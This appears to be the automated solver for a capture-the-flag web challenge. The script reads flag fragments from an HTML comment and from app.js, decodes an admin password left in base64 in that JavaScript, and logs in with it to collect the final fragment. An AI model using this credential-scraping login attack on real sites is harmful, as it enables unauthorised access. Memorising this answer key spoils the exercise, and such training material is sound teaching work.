#!/usr/bin/env python3
"""Automated solver for challenge 1 - inspect-the-source.

Steps:
  1. GET / and read the first flag fragment from the HTML comment.
  2. GET /static/app.js, read the second fragment and decode the admin password.
  3. POST the recovered credentials to /login and read the final fragment.
  4. Concatenate the fragments in order and print the flag.
"""

import base64
import re
import sys

import requests

PART1_RE = re.compile(r"flag fragment 1/3:\s*([A-Za-z0-9_{}]+)")
PART2_RE = re.compile(r'DEBUG_FLAG_FRAGMENT\s*=\s*"([^"]+)"')
PART3_RE = re.compile(r"flag fragment 3/3:\s*(?:<[^>]+>)*\s*([A-Za-z0-9_{}]+)")
USER_RE = re.compile(r'ADMIN_USER\s*=\s*"([^"]+)"')
PASS_B64_RE = re.compile(r'ADMIN_PASS_B64\s*=\s*"([^"]+)"')
FLAG_RE = re.compile(r"^ingehack\{[a-z0-9_]+\}$")


def log(message):
    print("[*] " + message, file=sys.stderr)


def fail(message):
    print("[-] " + message, file=sys.stderr)
    sys.exit(1)


def main():
    base = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8001"
    session = requests.Session()

    # 1. The first fragment is an HTML comment in the login page source.
    page = session.get(base + "/", timeout=10)
    page.raise_for_status()
    match = PART1_RE.search(page.text)
    if not match:
        fail("flag fragment 1/3 not found in the page source")
    part1 = match.group(1)
    log("fragment 1/3 (HTML comment): " + part1)

    # 2. The second fragment and the admin credentials live in app.js.
    js = session.get(base + "/static/app.js", timeout=10)
    js.raise_for_status()
    part2_match = PART2_RE.search(js.text)
    user_match = USER_RE.search(js.text)
    pass_match = PASS_B64_RE.search(js.text)
    if not (part2_match and user_match and pass_match):
        fail("credentials or fragment 2/3 not found in app.js")

    part2 = part2_match.group(1)
    username = user_match.group(1)
    password = base64.b64decode(pass_match.group(1)).decode("utf-8")
    log("fragment 2/3 (app.js): " + part2)
    log("recovered credentials: %s / %s" % (username, password))

    # 3. The server checks the same credentials and returns the last fragment.
    login = session.post(
        base + "/login",
        data={"username": username, "password": password},
        timeout=10,
    )
    login.raise_for_status()
    match = PART3_RE.search(login.text)
    if not match:
        fail("flag fragment 3/3 not found after login")
    part3 = match.group(1)
    log("fragment 3/3 (after login): " + part3)

    # 4. Reassemble the flag.
    flag = part1 + part2 + part3
    if not FLAG_RE.match(flag):
        fail("assembled flag has an unexpected format: " + flag)
    print(flag)


if __name__ == "__main__":
    main()
